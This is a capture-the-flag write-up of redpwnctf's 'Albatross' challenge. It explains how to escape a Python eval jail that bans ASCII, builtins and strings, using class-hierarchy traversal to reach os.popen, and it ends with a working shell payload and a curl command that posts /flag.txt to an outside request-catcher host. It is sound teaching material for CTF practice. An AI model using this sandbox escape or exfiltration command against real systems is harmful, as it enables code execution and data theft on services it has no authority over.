---
layout: post
title: "Albatross: Breaking out of pyjail with your hands tied."
description: "Writeup to redpwnctf's Albatross challenge, where you'd need to take advantage of a python 'eval' without using ASCII characters, strings, and no python builtin functions."
tags: [ctf, misc, pyjail]
---

# Introduction

In [redpwnctf](https://2020.redpwn.net/) this year, there was a really cool python exploit challenge! The goal was to take advantage of an `eval` to read a flag from the server. There were a couple catches though. 

- No ASCII characters!
- No built in functions!
- No strings!
- No more than 102 characters!

Woah, that's not looking too easy. But it's alright, since we can use a couple tricks up our sleeves to get a shell and ultimately read the flag. Let's go over each requirement and how we are going to bypass it.

## No ASCII characters?

That's alright! The target python version, python 3.7, allows you to use *italized* characters to write your expressions, which aren't ascii. We encoded our payloads using italics on [this website](https://lingojam.com/ItalicTextGenerator). This way our payload can fly by the blacklist, easy peasy.

## No built in functions?

This is the trickier parts of breaking out of pyjail. The `eval` sets the `__builtins__` variable to `None`, so we unfortunately can't use builtin functions to read from the file system. This means no `open`, no `execfile`, no nothing. That's ok, because we can use a little trick to access other modules without needing to import them, as well as without builtins.

### The Python Class Hierarchy

The python class hierarchy is going to be our gateway to accessing other modules, like `os`, so we can read from the filesystem or get a shell. So, how do we do this? Well, we're going to need to learn how to traverse the python class hierarchy. First, let's take a look at the following code.

```python
().__class__
```

What does this do? Well, the `__class__` attribute of returns the class of an instance. For example, if we had a class, `CoolCat`, like this and an instance of that class, `charlie`...

```python
class CoolCat:
  def say_hi():
    print("hello!")
charlie = CoolCat()
```

We'd be able to access `CoolCat` from `charlie` through the `__class__` attribute! 

```python
assert (charlie.__class__ == CoolCat), "This assertion will never fail!"
```

## `__base__`

So, if we go back to our first example, we would get the class `tuple`, which will help us in a bit. The next thing we are going to talk about is `__base__`. `__base__` allows to access the parent of a class. The parent of all classes who don't already have a parent is `object`. So, we can structure our hierarchy a little like this:

```
       /-tuple
object-
       \-CoolCat
```

Now, there are **way** more classes which inherit from object. But for now, let's consider these two cases.

So we know we can go from a child class (like `tuple` or `CoolCat`) to a parent class (like `object`) by using `__base__`, but can we go the other way around? Can we use a property of `object` to access `CoolCat` or `tuple`? And the answer is yes! With the power of the `__subclasses__` function.

## `__subclasses__`

Subclasses allow us to find classes which inherit from a given class. For example, if I wanted to find the classes which inherit from `CoolCat`, I'd call `__subclasses__`.

```python
CoolCat.__subclassess__()
# -> []
# this outputs an empty array because nothing currently inherits from CoolCat!
```

Now, what would happen if we called `__subclasses__` on the `object` class? Well, we'd get a list of classes which inherit from the `object` class, including `CoolCat` and `tuple`. Remember how I said there's a lot more than just `CoolCat` and `tuple`? Well, turns out, the `__subclasses__` function returns **all** of the subclasses, including classes from other modules! This means that this `__subclasses__` will be our connection to ouside the `eval` jail. Putting together all we learned, `__class__`, `__base__`, and `__subclasses__`, we can get a list of all classes, including other modules, that inherit from `object`. Next, we'll cover how to go from accessing a class from another module to accessing the module itself.

```python
().__class__.__base__.__subclasses__()
# -> [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, ..., <class 'rlcompleter.Completer'>]
# includes classes from the python builtins (int, bytearray, str, etc etc) but also classes from other modules (re.Scanner, operator.methodcaller, etc etc etc) and even CoolCat (__main__.CoolCat)!
```

### From Class to Module

So we've found our link to other modules. We can access classes from other modules through subclasses, but how do we access variables and functions from those modules? Well, let's go over what `__globals__` does and how we can use it.

`__globals__` is a variable defined for all functions. It is a dictionary that contains all the variables and functions in the global scope that have the same module scope as itself. This means if we can get a function from a class in another module, we'd be able to access the global scope of another module through that function's `__globals__` property! So... what functions can we use that is present in all classes? Well, a function which is present in all classes no matter the class's functions or properties is `__init__`. 

Let's say, in main, we have a global variable named `jamie`. Going back to the `CoolCat` class and `charlie`, how can we access `jamie` by only accessing properties of `charlie`? Well, we just need a function that's defined in `CoolCat`! `CoolCat` has `say_hi` defined, so we could use that, or we can use the `__init__` function which is present in all classes.

```python
charlie.__class__.__init__.__globals__["jamie"]
```

### Putting it all together

Now, let's try combining the hierarchy traversal method with the function global variable lookup to access the `os` module's `popen`.

```python
# the index for the class "os._wrap_close" in the list of subclasses is 127
().__class__.__base__.__subclasses__()[127].__init__.__globals__["popen"]("sh")
```

Just like that, we've accessed the `popen` function! We can run arbitrary commands on the machine now with this function. Here, I've run the "sh" command, which opens a shell. But wait... We can't use strings??!!

## No Strings?

Our exploit above requires us to use two strings. "popen" and "sh" are both required for our exploit to work! "popen" grabs the `popen` function from the `__globals__` dictionary, and "sh" is needed to open a shell. Surely there must be a way to not need to use strings or make these strings without quotes?

### String Frankenstein: Making strings from segments of other strings

Strings in python is that they can be sliced and concatinated. You can turn one string into an entirely new string just with indexing and concatination. Watch how I transform one string into another one:

```python
s = "I hate pyjails!"
s[7] + s[5] + s[7] + s[13] + s[11]
# -> 'pepsi'
```

Maybe we can use strings from instances of classes to create a string made up of other strings? Well, what strings are present in classes? Well, `__doc__`, of course! `__doc__` is a property which provides documentation on a type. In this case, we can leverage that to our advantage.

```python
().__doc__
# -> 'Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.'
```

Just like that, a string we can mess with! So, to build the string 'sh'...

```python
().__doc__[19] + ().__doc__[56]
# -> 'sh'
```

String requirement alleviated! Let's apply this to our exploit.

```python
().__class__.__base__.__subclasses__()[127].__init__.__globals__[().__doc__[84]+().__doc__[34]+().__doc__[84]+().__doc__[17]+().__doc__[7]](().__doc__[19]+().__doc__[56])
```

It works! But hold on... this is 170 characters??!?!?

## No more than 102 characters?

Making strings occupies **a lot** of characters. This means we have two routes.

- Find a more efficent method of creating strings
- Don't make strings

I'll get "popen" without strings, and shorten our method of getting "sh".

### The "popen" predicament

Currently, we index `__globals__` with `popen` in order to get the `popen` function. What if there was a better way to index it, without strings? Well, we can extract just the values from a dictionary and put them into an array. That way, we can index the `__globals__` dictonary with integer indexes, no longer needing strings! Let's first get the values of the dictionary as an array, throwing away the keys.

```python
().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()
# -> dict_values([...])
```

Wait.. this doesn't return an array! This returns a `dict_list` class! That's alright. We can use a new python feature to convert a array-like object, like a  `dict_list`, to an array that we can index.

```python
[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()]
# -> [..., <function fdopen at 0x10fc40ef0>, <function _fspath at 0x10fc43320>, <class 'os.PathLike'>]
```

Phew, now we can index this array by a number!

```python
[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()][-5]()
# -> <function popen at 0x10fc40e60>
```

We've reduced indexing `popen` to just 82 characters.

### The "sh" situation

We've got 20 characters left to make the "sh" string. We've got no more gimmicks like what he had with"popen", so we've got to think of a new method. I figured we'd only be able to make one reference to `__doc__`, because `().__doc__[]` costs 12 characters. This seems impossible without string slicing a string which already has "sh" within it, but it's actually not. String slicing has one more trick up it's sleeve that will allow us to construct "sh" in just a few characters. Standard string slicing allows us to select a range of characters from a string and extract them. For example:

```python
"why is pyjail so hard?"[7:13]
# -> 'pyjail'
```

But, there's one more thing string slicing can do. There's a 3rd parameter for string slicing, known as "stride", which specifies how many characters to move forward after the a character is read from the string. By default, the stride is one, but we can customize it to however much we want. So, what if we first set the starting index to the first index of 's', then set the stride large enough so that the next character is the last index of 'h'? This would mean after 's' is read, the stride would jump a huge amount of characters, all the way until the last 'h', at which no more strides can be taken because the string is not long enough. So, our slice would be equivlient to:

```python
doc = ().__doc__
doc[doc.index('s')::doc.rindex('h') - doc.index('s')]
# -> 'sh'
```

Simplifying this:

```python
().__doc__[19::199]
# -> 'sh'
```

## No problem?

Let's put it all together, for real this time. Don't forget to italicize your payload!

```python
[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()][-5](().__doc__[19::199])
```

### Small problem?

Yea.. slight problem. Unfortunately, due to `popen`'s functionality, we can't see the output of the programs we run. But that's alright! We can use `curl` to send the flag as the body of a POST request to a [request catcher](https://requestcatcher.com).

This is what I used:

```bash
curl -X POST -d `cat /flag.txt` https://pepsipu.requestcatcher.com
```

And on the request catcher, the recieved request is:

![request catcher with flag](https://i.gyazo.com/0d4f13ab469df40451b9c290c2f2dc21.png)

There's our flag!

`flag{SH*T_I_h0pe_ur_n0t_b1c..._if_y0u_@r3,_th1$_isn't_th3_fl@g}`